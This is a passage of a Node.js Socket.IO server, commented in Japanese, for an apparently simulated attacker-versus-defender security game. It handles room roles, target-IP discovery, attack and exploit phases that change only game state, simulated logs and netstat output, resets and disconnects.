    socket.roomId = roomId; // ソケットに部屋IDを記憶させる
    socket.role = role;

    const r = getRoom(roomId);
    if (role === 'ATTACKER') {
      r.attackerSocketId = socket.id;
      initAttackerPty(roomId);
    }
    if (role === 'DEFENDER') {
      r.defenderSocketId = socket.id;
      initPty(roomId);
    }

    console.log(`[+] ${socket.id} joined ${roomId} as ${role}`);
    socket.emit('game_state', getPublicState(r));
    broadcastRoomsStatus();
    checkMatchStart(roomId);
  });

  // ─── 防御側: IP選択 ───────────────────────────
  socket.on('select_target_ip', ({ ip }) => {
    const r = getRoom(socket.roomId);
    if (!r || r.phase !== 'SELECTING_IP' || socket.role !== 'DEFENDER') return;

    r.targetIp = ip;
    r.phase = 'DISCOVERING';
    io.to(r.id).emit('game_state', getPublicState(r));
    io.to(r.attackerSocketId).emit('start_discovery', { message: '防御側がターゲットIPを設定しました。スキャンしてIPを特定してください。' });
  });

  // ─── 攻撃側: IP発見（スキャン） ───────────────────
  socket.on('scan_target_ip', ({ ip }) => {
    const r = getRoom(socket.roomId);
    if (!r || r.phase !== 'DISCOVERING' || socket.role !== 'ATTACKER') return;

    if (ip === r.targetIp) {
      r.phase = 'IDLE';
      socket.emit('scan_result', { success: true, ip, message: `IP ${ip} is UP! Target identified.` });
      io.to(r.id).emit('game_state', { ...getPublicState(r), targetIp: r.targetIp });
    } else {
      socket.emit('scan_result', { success: false, ip, message: `Host ${ip} is down.` });
    }
  });

  // ─── 攻撃側: 攻撃開始 ─────────────────────────
  socket.on('start_attack', ({ attackType }) => {
    const r = getRoom(socket.roomId);
    if (!r || r.blockedSocketIds.has(socket.id) || r.phase !== 'IDLE') {
      socket.emit('blocked'); return;
    }
    r.phase = 'ATTACKING';
    r.attackType = attackType;
    console.log(`[ATTACK] ${attackType} started by ${socket.id} in ${r.id}`);

    // Defenderに検知アラートを送る
    setTimeout(() => {
      io.to(r.id).emit('attack_detected', {
        ip: r.attackerIp,
        timestamp: new Date().toISOString(),
        message: `不審な兆候を検知: 攻撃の可能性があります`,
      });
    }, 2000);

    // 攻撃の第一歩をAttackerに返す
    setTimeout(() => {
      if (r.blockedSocketIds.has(socket.id)) {
        socket.emit('blocked'); return;
      }
      socket.emit('attack_started', {
        attackName: attackType.toUpperCase(),
        detail: `ターミナルを使用してブルートフォース等の攻撃を実行してください。`,
      });
      io.to(r.id).emit('game_state', getPublicState(r));
      broadcastRoomsStatus();
    }, 500);
  });

  // ─── 攻撃側: エクスプロイト・目的達成 ──────────────────────────────────
  socket.on('execute_exploit', () => {
    const r = getRoom(socket.roomId);
    if (!r || r.blockedSocketIds.has(socket.id) || r.phase !== 'ATTACKING') {
      socket.emit('blocked'); return;
    }
    console.log(`[ATTACK] Exploit by ${socket.id} in ${r.id}`);

    // Set to COMPLETED directly
    r.phase = 'COMPLETED';
    socket.emit('exploit_success', {
      message: 'エクスプロイト成功。システム権限またはデータを奪取しました。',
    });
    io.to(r.id).emit('game_state', getPublicState(r));
  });

  // ─── 防御側: ログ取得 ──────────────────────────────────────
  socket.on('get_logs', () => {
    const r = getRoom(socket.roomId);
    if (!r) return;
    const includeAttack = r.phase !== 'WAITING' && r.phase !== 'IDLE';
    socket.emit('logs_data', {
      authlog: generateAuthLogs(r, includeAttack),
      attackerIp: r.attackerIp,
    });
  });

  // ─── 防御側: netstat取得 ───────────────────────────────────
  socket.on('get_netstat', () => {
    const r = getRoom(socket.roomId);
    if (!r) return;
    socket.emit('netstat_data', { output: generateNetstatOutput(r) });
  });

  // ─── 防御側: IPブロック ────────────────────────────────────
  socket.on('block_attacker', ({ ip }) => {
    // legacy support for UI block button if still needed, but backend handles internal ptý via POST
  });

  // ─── 防御側: 被害調査 ──────────────────────────────────────
  socket.on('investigate_damage', () => {
    // legacy
  });

  // ─── 防御側: バックドア遮断 ───────────────────────────────
  socket.on('remove_backdoor', ({ method, value }) => {
    // legacy
  });

  // ─── ゲームリセット ────────────────────────────────────────
  socket.on('reset_game', () => {
    if (socket.roomId) {
      resetRoom(socket.roomId);
      io.to(socket.roomId).emit('game_reset');
      console.log(`[SYSTEM] Game reset in ${socket.roomId}`);
      broadcastRoomsStatus();
    }
  });

  socket.on('disconnect', () => {
    console.log(`[-] Disconnected: ${socket.id}`);
    if (socket.roomId) {
      const r = getRoom(socket.roomId);
      if (socket.role === 'ATTACKER') r.attackerSocketId = null;
      if (socket.role === 'DEFENDER') r.defenderSocketId = null;
      if (!r.attackerSocketId && !r.defenderSocketId) resetRoom(socket.roomId);
      broadcastRoomsStatus();
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
